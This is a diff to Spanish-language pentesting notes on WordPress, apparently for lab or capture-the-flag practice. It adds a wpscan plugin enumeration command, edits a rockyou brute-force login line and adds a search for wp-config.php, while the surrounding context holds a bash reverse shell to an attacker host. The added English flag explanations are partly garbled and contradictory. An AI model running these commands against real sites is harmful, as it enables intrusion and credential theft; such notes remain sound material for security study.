@@ -20,10 +20,21 @@ wpscan --url http://<IP>/blog --enumerate u,vp
 - `u` -> Enumera usuarios
 - `vp` -> Enumera plugins vulnerables
 
+Para enumerar plugins de forma más específica.
+
+```
+wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection aggressive -t 100
+```
+
+- `-e p`-> enumerate plugins
+- `--disable-tls-checks`->  skip TLS checks  
+- `--plugins-detection passive`-> aset the plugin detection mode to passive 
+- `-t 100`->  nd use 100 threads to speed up the enumeration. 
+- `--plugin-detection aggressive`->  Alternatively, for more intensive plugin detection.
 ## Fuerza Bruta al Login
 
 ```bash
-wpscan --url http://<IP>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+wpscan --url http://<IP>/<blog> --passwords /usr/share/wordlists/rockyou.txt --usernames admin
 ```
 
 ## Obtener Reverse Shell
@@ -53,3 +64,7 @@ La shell obtenida puede ser inestable, por lo que conviene enviar una segunda:
 nc -nlvp <puerto>
 bash -c "sh -i >& /dev/tcp/<IP_atacante>/4444 0>&1"
 ```
+
+
+find /var -name 'wp-config.php' -type f 2>/dev/null
+
